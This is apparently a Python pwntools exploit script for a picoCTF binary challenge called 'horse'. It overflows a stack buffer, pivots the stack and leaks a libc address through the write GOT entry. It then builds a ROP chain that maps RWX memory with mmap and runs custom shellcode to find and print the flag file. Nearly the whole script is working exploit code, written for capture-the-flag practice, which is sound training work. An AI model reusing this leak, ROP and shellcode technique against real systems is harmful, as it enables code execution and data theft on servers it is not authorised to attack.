from pwn import * 
context.log_level = 'debug'
context.arch = 'amd64'
context.os = 'linux'
#r = gdb.debug('./horse_patched', 'b *main+58\nc')
#r = process('./horse_patched')
#r = process(['strace', '-o', '/tmp/strace.out', './horse_patched'])
#r = remote('localhost', 5000)
r = remote('mars.picoctf.net', 31809)
e = ELF('./horse')
libc = ELF('./libc.so.6')
# 40 bytes of padding
pop_rdi = 0x0000000000400c03
pop_rsi_r15 = 0x0000000000400c01
ret_gadget = 0x00000000004005a8
read_input = 0x00400b6f
writable_start = 0x602000
writable_end = writable_start + 0x1000
leave_ret = 0x0000000000400a86
leak_info = 0x00400ab4
#payload = b'a'*32+p64(writable_start + 0x200)+p64(pop_rdi)+p64(1)+p64(pop_rsi_r15)+p64(e.got['write'])+p64(0)+p64(e.plt['write'])+p64(read_input)
payload = b'a'*32+p64(writable_end-0x200)+p64(read_input)
#with open('/tmp/payload', 'wb') as f: f.write(payload)
r.sendline(payload)
r.sendline(b'a'*32+p64(writable_end-0x200+8*2+0x28)+p64(leak_info)+p64(e.got['write'])+p64(0)*4+p64(writable_end-0x200+8*2+0x28+0x50)+p64(ret_gadget)+p64(read_input))
for _ in range(2): r.recvuntil(b'\xc2\xb4\x0a')
print('waiting for libc leak')
r.recvuntil(b'\x0a\x3c\x20')
write_addr = u64(r.recv(6, timeout=5*60)+b'\x00\x00')
print(f'write_addr = {hex(write_addr)}')
libc.address = write_addr - libc.sym['write']
print(f'libc.address = {hex(libc.address)}')
pop_rsp = libc.address + 0x0000000000032b5a

pop_rdi = libc.address + 0x0000000000026b72 
pop_rsi = libc.address + 0x0000000000027529 
pop_rdx_r12 = libc.address + 0x000000000011c371
pop_rcx = libc.address + 0x000000000009f822 
clear_r8 = libc.address + 0x0000000000049dfd 
clear_r9 = libc.address + 0x00000000000c9ccf 
mov_rsi_rax = libc.address + 0x00000000001621e2
arb_write = libc.address + 0x000000000014b28a # write to rsi+0x10 rax 
read_rax = libc.address + 0x000000000014417c # mov rax, [rax]
pop_rax = libc.address + 0x000000000004a550
push_rax = libc.address + 0x0000000000045197
push_rsi = libc.address + 0x0000000000045443


def readtoaddr(addr, l):
    read_chain = p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(addr)+p64(pop_rdx_r12)+p64(l)+p64(0)+p64(e.plt['read'])
    return read_chain 
def readchain(l):
    new_rsp = writable_end - l 
    return readtoaddr(new_rsp, l) + p64(pop_rsp)+p64(new_rsp)

print('assembling shellcode')
# read file with mmap
shellcode = asm(f'''
/* fix rsp */ 
mov rsp, {hex(writable_end)}
/* open directory . */

push 0x2e 
mov rax, 2 
mov rdi, rsp 
mov rsi, 0 
mov rdx, 0 
syscall

/* getdents64 */
sub rsp, 0x400 
mov rdi, rax  
mov rax, 217
mov rsi, rsp 
mov rdx, 0x400
syscall 

/* get flag filename */ 
mov rdi, rsp 
loop:
mov al, [rdi+19]
cmp al, 'f'
je final 
movzx rax, byte ptr [rdi+16]
add rdi, rax
jmp loop 

final:
/* open file */
mov rax, 2 
lea rdi, [rdi+19]
mov rsi, 0 
mov rdx, 0 
syscall 

/* mmap the file */
mov r8, rax /* fd */
mov rax, 9 /* syscall number */
mov rdi, 0 /* addr */
mov rsi, 0x1000 /* len */
mov rdx, {constants.PROT_READ} /* prot */
mov r10, {constants.MAP_FILE|constants.MAP_PRIVATE} /* flags */
mov r9, 0 /* off */ 
syscall

/* write file contents to stdout */
mov rsi, rax 
mov rax, 1 
mov rdi, 1  
mov rdx, 100 
syscall 

/* exit */
mov rax, 60 
mov rdi, 0 
syscall
''')


chain = p64(pop_rdi)+p64(0)
chain += p64(pop_rsi)+p64(0x1000)
chain += p64(pop_rdx_r12)+p64(constants.PROT_READ|constants.PROT_WRITE|constants.PROT_EXEC)+p64(0)
chain += p64(pop_rcx)+p64(constants.MAP_ANONYMOUS|constants.MAP_PRIVATE)
chain += p64(clear_r8)+p64(clear_r9)
chain += p64(libc.sym['mmap'])
# save shellcode address
# edit: not actually needed since rsi is preserved
#chain += p64(pop_rsi) + p64(writable_start) + p64(arb_write)
chain += p64(pop_rcx) + p64(0) + p64(mov_rsi_rax)
chain += p64(pop_rdi) + p64(0) + p64(pop_rdx_r12) + p64(len(shellcode)) + p64(0) + p64(e.plt['read'])
#chain += p64(pop_rax) + p64(writable_start+0x10) + p64(read_rax)
#chain += p64(push_rax)
chain += p64(push_rsi)

r.send(b'a'*32+p64(writable_end)+readchain(len(chain)))
#input('enter to send first chain')
r.send(chain)
#input('enter to send shellcode')
r.sendline(shellcode)

r.interactive()
